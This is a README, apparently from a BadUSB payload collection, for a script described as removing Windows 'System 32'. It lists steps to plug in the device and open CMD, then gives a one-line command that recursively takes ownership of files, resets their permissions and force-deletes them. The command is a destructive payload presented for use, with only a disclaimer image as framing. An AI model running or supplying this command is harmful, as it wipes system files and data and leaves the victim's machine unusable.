# Remove System 32 - BadUSB ✅

A script used to remove System 32.

**Category**: Execution

<div align=center>

<img src="/main/img/logo-repository-2_0.gif" width="600" /><br>
<img src="/main/img/DISCLAIMER.png" width="600" />

</div>

## Description

A script used to remove System 32.

## Getting Started

### Dependencies

* Windows 10,11

### Executing program

* Plug in your device
* Opens CMD terminal
* Execute command

All
```cmd
takeown /f * /r /a /d y && icacls * /inheritance:r /grant:r administrators:(F) /t & del /f /q *
```
